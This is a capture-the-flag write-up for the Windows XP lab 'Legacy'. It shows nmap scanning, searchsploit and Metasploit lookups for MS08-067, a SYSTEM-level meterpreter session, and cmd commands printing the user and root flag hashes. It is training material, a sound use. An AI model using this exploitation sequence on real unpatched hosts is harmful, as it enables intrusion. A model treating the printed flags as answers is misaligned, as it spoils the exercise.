## Legacy

### Lab Details 

- Difficulty: Easy
- Type: SMB, Priv Esc, Windows

#### Tasks
Q1: How many TCP ports are open on Legacy?
 - run nmap `nmap -sT -T4 -vv -A -p- -Pn -oA Legacy 10.10.10.4`
```
<snip>
PORT    STATE SERVICE      REASON  VERSION
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Windows XP microsoft-ds
<snip>
```

Q2: What is the 2008 CVE ID for a vulnerability in SMB that allows for remote code execution?
- search for MS08 using searchsploit
```
------------------------------------------------------------------------------------------------- --------------------------------
 Exploit Title                                                                                   |  Path
------------------------------------------------------------------------------------------------- --------------------------------
<snip>
Microsoft Windows Server - Code Execution (MS08-067)                                             | windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC) (MS08-067)                                       | windows/dos/6824.txt
Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Metasploit)        | windows/remote/16362.rb
Microsoft Windows Server - Universal Code Execution (MS08-067)                                   | windows/remote/6841.txt
Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                   | windows/remote/7132.py
<snip>
------------------------------------------------------------------------------------------------- --------------------------------
```

Q3: What is the name of the Metasploit module that exploits CVE-2008-4250?
- search for `MS08_067` in msfconsole
```
msf6 exploit(windows/smb/ms08_067_netapi) > search ms08_067

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack
<snip>

msf6 exploit(windows/smb/ms08_067_netapi) > search windows xp 2008
<snip>
116  exploit/windows/smb/ms08_067_netapi                                                                  2008-10-28       great      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   117    \_ target: Automatic Targeting                                                                     .                .          .      .
   118    \_ target: Windows 2000 Universal                                                                  .                .          .      .
   119    \_ target: Windows XP SP0/SP1 Universal                                                            .                .          .      .
   120    \_ target: Windows 2003 SP0 Universal                                                              .                .          .      .
   121    \_ target: Windows XP SP2 English (AlwaysOn NX)                                                    .                .          .      .
   122    \_ target: Windows XP SP2 English (NX)                                                             .                .          .      .
<snip>
```

Q4: When exploiting MS08-067, what user does execution run as? Include the information before and after the .
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Q5: Sumit flags in user.txt and root.txt 
```
C:\>cd "Documents and Settings"

C:\Documents and Settings>dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.326.054.912 bytes free

C:\Documents and Settings>type john\Desktop\user.txt
type john\Desktop\user.txt
e69af0e4f443de7e36876fda4ec7644f
C:\Documents and Settings>type administrator\desktop\root.txt
type administrator\desktop\root.txt
993442d258b0e0ec917cae9e695d5713
```


#### Resources

#### Lesson Learned
